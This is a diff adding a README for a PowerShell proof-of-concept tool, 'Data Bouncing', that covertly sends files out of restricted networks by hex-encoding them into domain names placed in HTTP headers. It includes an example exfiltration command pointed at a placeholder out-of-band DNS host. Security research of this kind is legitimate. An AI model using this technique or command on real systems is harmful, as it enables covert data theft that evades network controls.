@@ -1,4 +1,33 @@
-# DataBouncing
+# Data Bouncing - PowerShell Version
+
+## Overview
+Data Bouncing is a technique used to transmit data between two endpoints using DNS lookups and HTTP header manipulation. This PowerShell version of the project encapsulates the core functionalities of data bouncing, including reconnaissance, data exfiltration, and file reassembly.
+
+### Background
+This project is a proof of concept (PoC) based on ideas by John and Dave, detailed at [The Contractor](https://thecontractor.io/DataBouncing). It demonstrates how to use DNS queries and HTTP headers for discreet data transfer.
+
+## Components
+The PowerShell project consists of two main scripts:
+
+- `exfil.ps1`: Handles the exfiltration of data.
+- `recreate.ps1`: Manages the reassembly of the exfiltrated data.
+
+### `exfil.ps1`
+This script encodes a file into hexadecimal format, splits it into chunks, and then sends each chunk as part of a domain name in an HTTP request header. This process helps in exfiltrating data from networks where direct transfer methods are restricted.
+
+### `recreate.ps1`
+It processes the data received from the `exfil.ps1` script. This includes finding specific patterns in logs, assembling data chunks, and converting hexadecimal data back to its original form.
+
+## Usage
+### Prerequisites
+- A controlled DNS server is required.
+- For hobbyist or learning purposes, [InteractSh](https://github.com/projectdiscovery/interactsh) is recommended.
+
+### Running the Scripts
+1. **Data Exfiltration**:
+   ```powershell
+   exfil -regex 'your-regex' -domain 'your-domain.oast.online' -url 'target-url.com' -filepath '.\path\to\file.txt'
+
 
 You have two options. 
 Use the [InteractSh Web Client](https://app.interactsh.com/#/) or 
